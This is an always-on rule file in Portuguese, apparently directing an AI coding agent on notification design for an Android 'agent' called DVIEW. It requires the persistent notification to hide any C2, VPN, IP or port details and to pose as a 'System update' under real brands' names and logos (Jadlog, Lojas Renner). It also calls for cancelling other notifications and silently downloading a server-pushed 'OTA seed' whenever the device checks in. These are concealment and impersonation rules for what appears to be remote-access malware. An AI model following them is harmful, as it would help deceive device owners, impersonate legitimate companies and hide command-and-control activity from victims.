---
name: android-notification-standards
description: Diretrizes obrigatórias de notificação persistente corporativa do Android Agent no DVIEW
trigger: always_on
---

# Padrão de Notificações Corporativas do Android Agent (DVIEW)

Esta regra define os padrões inegociáveis para notificações persistentes (`ForegroundService`) no agente Android e em suas simulações no painel web.

## 1. Zero Exposição Técnica
- **Proibição Absoluta**: NUNCA exibir detalhes técnicos de infraestrutura ou rede na gaveta de notificações do Android, tais como:
  - Endereços IP (ex: `192.168.x.x`, `10.x.x.x`).
  - Portas de conexão (ex: `:8443`, `:3000`).
  - Nomes de protocolos ou infraestrutura interna (ex: `Túnel VPN`, `TLS`, `UDP`, `C2`).
  - Mensagens de repetição ou reconexão (ex: `Reconectando ao servidor central (tentativa 69)...`).

## 2. Estrutura Visual da Notificação Corporativa
A notificação deve apresentar aparência 100% limpa, legítima e institucional:
- **Cabeçalho / Subtexto (`subText`)**: Nome do aplicativo registrado/instalado (`appName`, ex: "JAD LOG • agora", "Lojas Renner • agora").
- **Título (`contentTitle`)**: `System update` (ou identificador padrão do sistema operacional).
- **Texto (`contentText`)**: `New system software is available, Tap to learn more.`
- **Ícone / Logotipo (`largeIcon`)**: Logotipo oficial da marca cadastrada (ex: logotipo da Jadlog, Renner) ou emoji corporativo.
- **Sem alternância de status de conexão**: Não alternar para "● Conectado" ou "● Conectando". A notificação mantém permanentemente a mensagem padrão do sistema.

## 3. Notificação Única e Persistente
- Deve existir **apenas UMA notificação ativa** do aplicativo no sistema operacional (ID 578 / canal `system_update_channel`).
- Ao iniciar o `AgentForegroundService` ou qualquer serviço associado, cancelar ativamente notificações legadas ou secundárias (IDs 1001, 2002, 1, 2).
- O gerenciamento centralizado deve ser realizado via `AgentNotificationManager`.

## 4. Despacho Automático de Seed OTA ao Dar Sinal
- Assim que o dispositivo registrar presença ou enviar sinal (heartbeat, registro ou reconexão), o servidor despacha imediatamente o comando de atualização com a Seed OTA cadastrada.
- O aplicativo executa o download da atualização em segundo plano sem expor etapas intermediárias de conexão.
